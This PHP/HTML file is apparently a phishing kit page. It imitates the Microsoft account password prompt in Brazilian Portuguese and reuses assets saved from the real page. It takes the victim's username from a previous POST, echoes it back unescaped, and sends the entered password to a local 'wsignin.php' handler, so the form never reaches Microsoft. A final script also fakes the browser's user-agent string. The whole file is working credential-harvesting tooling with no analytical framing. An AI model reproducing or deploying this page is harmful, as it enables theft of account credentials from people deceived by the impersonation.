<?php
  //Não mostrar erros
  error_reporting (E_ALL & ~ E_NOTICE & ~ E_DEPRECATED);
   
  $username = $_POST['loginfmt'];
?>
<html dir="ltr" lang="PT-BR">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Entrar na conta da Microsoft</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var o=t[n]={exports:{},id:n,loaded:!1};return e[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){!function(){function e(){return u.$Config||u.ServerData||{}}function r(e,r){var t=u.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=u.$B;if(void 0===c)if(e)c=e.IE;else{var r=u.navigator.userAgent;c=r.indexOf("MSIE ")!==-1||r.indexOf("Trident/")!==-1}return c}function n(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>g&&e.substr(t-g,g).toLowerCase()===f}function o(){var r=e(),t=r.loader||{};return t.slReportFailure||r.slReportFailure||!1}function a(){var r=e(),t=r.loader||{};return t.redirectToErrorPageOnLoadFailure||!1}function i(){var r=e(),t=r.loader||{};return t.logByThrowing||!1}function s(e){var r=!0,t=e.src||e.href||"";if(t){if(n(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function d(){function t(e){var r=l.getElementsByTagName("head")[0];r.appendChild(e)}function o(e,r,t,o){var s=null;return s=n(e)?a(e):"script"===o.toLowerCase()?i(e):c(e,o),r&&(s.id=r),"function"==typeof s.setAttribute&&(s.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&s.setAttribute("integrity",t)),s}function a(e){var r=l.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=l.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function c(e,r){var t=l.createElement(r);return t.src=e,t}function u(e){if(!(m&&m.length>1))return e;for(var r=0;r<m.length;r++)if(0===e.indexOf(m[r]))return m[r+1<m.length?r+1:0]+e.substring(m[r].length);return e}function f(e,t,n,o){return r("[$Loader]: "+(L.failMessage||"Failed"),o),R[e].retry<p?(R[e].retry++,h(e,t,n),void d._ReportFailure(R[e].retry,R[e].srcPath)):void(n&&n())}function g(e,t,n,o){if(s(o)){r("[$Loader]: "+(L.successMessage||"Loaded"),o),h(e+1,t,n);var a=R[e].onSuccess;"function"==typeof a&&a(R[e].srcPath)}else f(e,t,n,o)}function h(e,n,a){if(e<R.length){var i=R[e];if(!i||!i.srcPath)return void h(e+1,n,a);i.retry>0&&(i.srcPath=u(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var s=o(i.srcPath,i.id,i.integrity,i.tagName);s.onload=function(){g(e,n,a,s)},s.onerror=function(){f(e,n,a,s)},s.onreadystatechange=function(){"loaded"===s.readyState?setTimeout(function(){g(e,n,a,s)},500):"complete"===s.readyState&&g(e,n,a,s)},t(s),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else n&&n()}var v=e(),p=v.slMaxRetry||2,y=v.loader||{},m=y.cdnRoots||[],L=this,R=[];L.retryOnError=!0,L.successMessage="Loaded",L.failMessage="Error",L.Add=function(e,r,t,n,o,a){e&&R.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},L.AddForReload=function(e,r){var t=e.src||e.href||"";L.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},L.AddIf=function(e,r,t){e&&L.Add(r,t)},L.Load=function(e,r){h(0,e,r)}}var c,u=window,l=u.document,f=".css",g=f.length;d.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?d.OnError(e,t):d.OnSuccess(e,t)},d.OnSuccess=function(e,t){var n=e.src||e.href||"",i=o(),c=a();if(!e)throw"The target element must be provided and cannot be null.";if(s(e)){r("[$Loader]: Loaded",e);var u=new d;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Load(null,function(){if(i)throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']";c&&(document.location.href="/error.aspx?err=504")})}else d.OnError(e,t)},d.OnError=function(e,t){var n=e.src||e.href||"",i=o(),s=a();if(!e)throw"The target element must be provided and cannot be null.";r("[$Loader]: Failed",e);var c=new d;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.AddForReload(e,t),c.Load(null,function(){if(i)throw"Failed to load external resource ['"+n+"']";s&&(document.location.href="/error.aspx?err=504")}),d._ReportFailure(0,n)},d._ReportFailure=function(e,r){if(i()&&!t())throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"},u.$Loader=d}()}]));</script><script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));</script><script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script>
    <link rel="shortcut icon" href="password_arquivos/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="password_arquivos/Converged_v21046_5plpI1P0_uKjrokWdqCoBw2.css">
  </head>
  <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
      <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">       
      </div>
      <div data-bind="if: activeDialog"></div>
      <form name="f1" id="i0281" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="wsignin.php?brazil=<?php $hora=date("H,i,s,A,z,n,m,u,d,g,o,l");echo"$hora"; ?>.seguro">
        <div class="outer" data-bind="component: { name: 'master-page',
          params: {
          serverData: svr,
          showButtons: svr.f,
          showFooterLinks: true,
          useWizardBehavior: svr.Bi,
          handleWizardButtons: false,
          password: password,
          hideFromAria: ariaHidden },
          event: {
          footerAgreementClick: footer_agreementClick } }">
          <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
            <div data-bind="
              animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
              css: {
              'app': backgroundLogoUrl,
              'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
              'fade-in-lightbox': fadeInLightBox,
              'has-popup': showFedCredButtons,
              'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
              externalCss: { 'sign-in-box': true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
              <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.br &amp;&amp; showLightboxProgress() }"></div>
              <div class="win-scroll">
                <div data-bind="component: { name: 'logo-control',
                  params: {
                  isChinaDc: svr.fIsChinaDc,
                  bannerLogoUrl: bannerLogoUrl() } }">
                  <img class="logo" role="img" pngsrc="password_arquivos/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="password_arquivos/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="password_arquivos/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
                </div>
                <div role="main" data-bind="component: { name: 'pagination-control',
                  publicMethods: paginationControlMethods,
                  params: {
                  enableCssAnimation: svr.aj,
                  disableAnimationIfAnimationEndUnsupported: svr.bv,
                  initialViewId: initialViewId,
                  currentViewId: currentViewId,
                  initialSharedData: initialSharedData,
                  initialError: $loginPage.getServerError() },
                  event: {
                  cancel: paginationControl_onCancel,
                  loadView: view_onLoadView,
                  showView: view_onShow,
                  setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                  animationStateChange: paginationControl_onAnimationStateChange } }">
                  <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                    <div data-bind="css: {
                      'animate': animate() &amp;&amp; animate.animateBanner(),
                      'slide-out-next': animate.isSlideOutNext(),
                      'slide-in-next': animate.isSlideInNext(),
                      'slide-out-back': animate.isSlideOutBack(),
                      'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
                      <div data-bind="component: { name: 'identity-banner-control',
                        params: {
                        userTileUrl: svr.bk,
                        displayName: sharedData.displayName || svr.j,
                        isBackButtonVisible: isBackButtonVisible(),
                        focusOnBackButton: isBackButtonFocused(),
                        backButtonDescribedBy: backButtonDescribedBy() },
                        event: {
                        backButtonClick: identityBanner_onBackButtonClick } }">
                        <div class="identityBanner">
                          <button type="button" class="backButton" data-bind="
                            attr: { 'id': backButtonId || 'idBtn_Back' },
                            ariaLabel: str['CT_HRD_STR_Splitter_Back'],
                            ariaDescribedBy: backButtonDescribedBy,
                            click: backButton_onClick,
                            hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Voltar">
                            <img role="presentation" pngsrc="password_arquivos/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="password_arquivos/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="password_arquivos/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
                          </button>
                          <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title=""><?php echo $username;?></div>
                        </div>
                      </div>
                    </div>
                    <!-- /ko -->
                    <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
                      'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.j),
                      'zero-opacity': hidePaginatedView.hideSubView(),
                      'animate': animate(),
                      'slide-out-next': animate.isSlideOutNext(),
                      'slide-in-next': animate.isSlideInNext(),
                      'slide-out-back': animate.isSlideOutBack(),
                      'slide-in-back': animate.isSlideInBack() }">
                      <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                        serverData: svr,
                        serverError: initialError,
                        isInitialView: isInitialState,
                        username: sharedData.username,
                        displayName: sharedData.displayName,
                        hipRequiredForUsername: sharedData.hipRequiredForUsername,
                        passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                        availableCreds: sharedData.availableCreds,
                        evictedCreds: sharedData.evictedCreds,
                        useEvictedCredentials: sharedData.useEvictedCredentials,
                        showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                        flowToken: sharedData.flowToken,
                        defaultKmsiValue: svr.AF === 1,
                        userTenantBranding: sharedData.userTenantBranding,
                        sessions: sharedData.sessions,
                        callMetadata: sharedData.callMetadata },
                        event: {
                        updateFlowToken: $loginPage.view_onUpdateFlowToken,
                        submitReady: $loginPage.view_onSubmitReady,
                        redirect: $loginPage.view_onRedirect,
                        resetPassword: $loginPage.passwordView_onResetPassword,
                        setBackButtonState: view_onSetIdentityBackButtonState,
                        setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                        <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                        <input type="hidden" name="login" data-bind="value: unsafe_username" value="">
                        <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" value="">
                        <input type="hidden" name="type" data-bind="value: svr.Bi ? 20 : 11" value="11">
                        <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                        <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                        <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                        <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
                        <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
                        <div id="loginHeader" class="row title ext-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }">Insira a senha</div>
                        <div class="row">
                          <div class="form-group col-md-24">
                            <div role="alert" aria-live="assertive">
                            </div>
                            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                              publicMethods: passwordTextbox.placeholderTextboxMethods,
                              params: {
                              serverData: svr,
                              hintText: str['CT_PWD_STR_PwdTB_Label'] },
                              event: {
                              updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                              <input name="passwd1" type="password" id="passwd1" autocomplete="off" required class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                                textInput: passwordTextbox.value,
                                ariaDescribedBy: [
                                'loginHeader',
                                showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                                unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                                placeholder: $placeholderText,
                                ariaLabel: unsafe_passwordAriaLabel,
                                moveOffScreen: showPassword,
                                externalCss: {
                                'input': true,
                                'text-box': true,
                                'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Senha" aria-label="Insira a senha para" tabindex="0">
								
								<input type="hidden" name="loginfmt" id="loginfmt" value="<?php echo $username; ?>"/>	
                            </div>
                          </div>
                        </div>
                        <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                          <div>
                            <div class="row">
                              <div class="col-md-24">
                                <div class="text-13">
                                  <div class="form-group">
                                    <a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: accessRecoveryLink || svr.O, click: resetPassword_onClick">Esqueceu a senha?</a>
                                  </div>
                                  <div class="form-group">
                                    <a href="#" data-bind="
                                      attr: { 'id': switchToCredId },
                                      text: switchToCredText,
                                      click: switchToCred_onClick" id="idA_PWD_SwitchToFido">Entrar com uma chave de segurança</a>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="win-button-pin-bottom">
                            <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                              <div data-bind="component: { name: 'footer-buttons-field',
                                params: {
                                serverData: svr,
                                primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                                isPrimaryButtonEnabled: !isRequestPending(),
                                isPrimaryButtonVisible: svr.f,
                                isSecondaryButtonEnabled: true,
                                isSecondaryButtonVisible: false },
                                event: {
                                primaryButtonClick: primaryButton_onClick } }">
                                <div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                  visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                  css: { 'no-margin-bottom': removeBottomMargin }">
                                  <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
                                    <input type="submit" id="idSIButton9" data-bind="
                                      attr: primaryButtonAttributes,
                                      externalCss: {
                                      'button': true,
                                      'primary': true },
                                      value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                      hasFocus: focusOnPrimaryButton,
                                      click: primaryButton_onClick,
                                      enable: isPrimaryButtonEnabled,
                                      visible: isPrimaryButtonVisible,
                                      preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Entrar">
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
            <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
            <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
            <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
            <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
            <input type="hidden" name="ctx" data-bind="value: ctx" value="">
            <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
            <input type="hidden" id="i0327" data-bind="attr: { name: svr.By }, value: flowToken" name="PPFT" value="DeTN*kIJphKyRogWRxgX6I!yf!yHPp3DNYqvGMdsRn6qeJSs*HwV5PH3IthU30GzIckY92gvb!d3smHdT4O5D9Q!AEzYFt27tXMBI5KnnecIwljNlAB6aO1yxMlrGQCPDfZ6bKkcd7jpLkb!w6dbJ0MVYBwynOE84*Oaz01PkrDujSgmV!C8hQYePxpntVaGCBSvlEbi7pYCygqofUWRGQz9xsgffkeaT5zk9h!0m4Jo9mtzRVA5*scaYAIvxqI!tw$$">
            <input type="hidden" name="PPSX" data-bind="value: svr.cJ" value="Passport">
            <input type="hidden" name="NewUser" value="1">
            <input type="hidden" name="FoundMSAs" data-bind="value: svr.Ah" value="">
            <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
            <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
            <input type="hidden" name="CookieDisclosure" data-bind="value: svr.a6 ? 1 : 0" value="0">
            <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
            <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
            <div data-bind="component: { name: 'instrumentation-control',
              publicMethods: instrumentationMethods,
              params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
              <input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
              <input type="hidden" name="i18" data-bind="value: srsSuccess">
              <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
            </div>
            <div id="footer" role="contentinfo" data-bind="
              css: {
              'default': !backgroundLogoUrl(),
              'new-background-image': useNewDefaultBackground },
              externalCss: { 'footer': true }" class="default footer ext-footer new-background-image">
              <div data-bind="component: { name: 'footer-control',
                publicMethods: footerMethods,
                params: {
                serverData: svr,
                useNewDefaultBackground: useNewDefaultBackground(),
                hasDarkBackground: backgroundLogoUrl(),
                showLinks: true },
                event: {
                agreementClick: footer_agreementClick,
                showDebugDetails: toggleDebugDetails_onClick } }">
                <div id="footerLinks" class="footerNode text-secondary">
                  <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="">Termos de uso</a>
                  <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="">Privacidade e cookies</a>
                  <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                    click: moreInfo_onClick,
                    ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                    attr: { 'aria-expanded': showDebugDetails().toString() },
                    hasFocusEx: focusMoreInfo()" aria-label="Clique aqui para obter informações sobre solução de problemas" aria-expanded="false">
                    <img class="desktopMode" role="presentation" pngsrc="password_arquivos/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" svgsrc="password_arquivos/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" data-bind="imgSrc" src="password_arquivos/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg"><!-- /ko -->
                    <img class="mobileMode" role="presentation" pngsrc="password_arquivos/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="password_arquivos/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="password_arquivos/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko -->
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
      <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
      <div id="idPartnerPL" data-bind="injectIframe: { url: svr.A2 }">
        <iframe style="display: none;" src="password_arquivos/prefetch.htm" width="0" height="0"></iframe>
      </div>
    </div>
  </body>
  <script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"})</script>
</html>